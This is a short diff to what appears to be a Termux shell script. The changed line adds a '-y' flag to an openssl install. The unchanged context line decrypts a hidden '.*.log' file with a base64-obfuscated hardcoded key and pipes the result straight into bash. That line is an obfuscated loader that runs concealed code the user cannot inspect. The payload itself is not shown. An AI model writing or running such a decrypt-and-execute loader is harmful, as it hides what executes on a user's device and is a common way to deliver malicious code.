@@ -9,5 +9,5 @@
 # Date        : 09-08-2023
 #####################################################
 
-pkg install openssl &> /dev/null
+pkg install openssl -y &> /dev/null
 openssl enc -d -base64 -aes-256-cbc -in .*.log -k $(echo "Z2hhbGFuZ3doLm9mZmljaWFsCg==" | base64 -d) -pbkdf2  | bash
